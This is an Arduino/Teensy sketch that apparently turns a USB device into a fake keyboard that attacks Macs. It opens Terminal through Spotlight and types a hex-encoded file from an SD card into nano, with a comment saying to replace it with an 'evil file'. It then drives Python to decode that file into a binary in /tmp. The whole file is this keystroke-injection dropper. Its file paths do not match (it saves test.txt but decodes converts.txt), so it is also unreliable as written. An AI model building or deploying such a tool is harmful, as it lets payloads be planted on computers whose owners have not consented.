/*
Teensy Hex to File SDCard Created by Josh Kelley (winfang) and Dave Kennedy (ReL1K)
Reading from a SD card.  Based on code from: http://arduino.cc/en/Tutorial/DumpFile
*/

// This the Mac version :)  This does not execute the code, but it does copy from the SD.

#include <avr/pgmspace.h>
#include <SD.h>

// Teensy ++ LED is 6.  Teensy the LED is 11.
int ledPin = 6;

void setup()
{
  BlinkFast(2);
  delay(5000);
  CommandAtSpotlight("Terminal");
  delay(7500);
  // Replace file name with evil file
  Keyboard.println("nano /tmp/test.txt");
  delay(1000);
  // This is the SS pin on the Teensy.  Pin 20 on the Teensy ++.  Pin 0 on the Teensy.
  const int chipSelect = 20;

  // make sure that the default chip select pin is set to
  // output, even if you don't use it:
  pinMode(10, OUTPUT);

  // see if the card is present and can be initialized:
  if (!SD.begin(chipSelect)) {
    Serial.println("Card failed, or not present");
    // don't do anything more:
    return;
  }

  // open the file. note that only one file can be open at a time,
  // so you have to close this one before opening another.
  // Larger the file, more likely it wouldn't fit in a normal int var.
  // This is the workaround for it.
  long int filePos;
  long int fileSize;
  File dataFile = SD.open("converts.txt");
  if (dataFile) {
    fileSize = dataFile.size();
    Keyboard.println("Start File");
    for (filePos = 0; filePos <= fileSize; filePos++) {
      Keyboard.print(dataFile.read(),BYTE);
      // Large files take a while to write out...this delay helps keep the keyboard on tract.
      delay(10);
      //Serial.print(dataFile.read(),BYTE);
    }
    dataFile.close();
    Keyboard.println("End File");
  }  
  else {
    Serial.println("error opening converts.txt");
  }
  // ADJUST THIS DELAY IF HEX IS COMING OUT TO FAST!
  delay(5000);
  CtrlX();
  delay(5000);

  // Use Python to convert file back to binary.
  // Play with the delays to make everything work right.
  Keyboard.println("python");
  delay(1000);
  Keyboard.println("import binascii");
  delay(1000);
  Keyboard.println("fileopen = open(\"/tmp/converts.txt\", \"rb\")");
  delay(1000);
  Keyboard.println("data = fileopen.read()");
  delay(1000);
  Keyboard.println("data = binascii.unhexlify(data)");
  delay(1000);
  Keyboard.println("filewrite = open(\"/tmp/theconverted.txt\", \"w\")");
  delay(1000);
  Keyboard.println("filewrite.write(data)");
  delay(1000);
  Keyboard.println("quit()");
}

void loop () {}

void BlinkFast(int BlinkRate){
  // Blinks the light...lets us know we're alive
  int BlinkCounter=0;
  for(BlinkCounter=0; BlinkCounter!=BlinkRate; BlinkCounter++){
    digitalWrite(ledPin, HIGH);
    delay(80);
    digitalWrite(ledPin, LOW);
    delay(80);
  }
}

void CtrlX(){
  // Save a file within Nano
  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.set_key1(KEY_X);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  delay(100);
  // Press Y to Save
  PRES(KEY_Y);
  delay(100);
  // Press Enter to Accept the file name
  PRES(KEY_ENTER);
}

void CommandAtSpotlight(char *SomeCommand){
  // Open Spotlight and find your program
  Keyboard.set_modifier(MODIFIERKEY_GUI); 
  Keyboard.set_key1(KEY_SPACE); 
  Keyboard.send_now(); 
  Keyboard.set_modifier(0); 
  Keyboard.set_key1(0); 
  Keyboard.send_now(); 
  delay(1500);
  Keyboard.print(SomeCommand);
  PRES(KEY_ENTER);
}

void PRES(int KeyCode){
  // Press a keyboard button
  Keyboard.set_key1(KeyCode);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
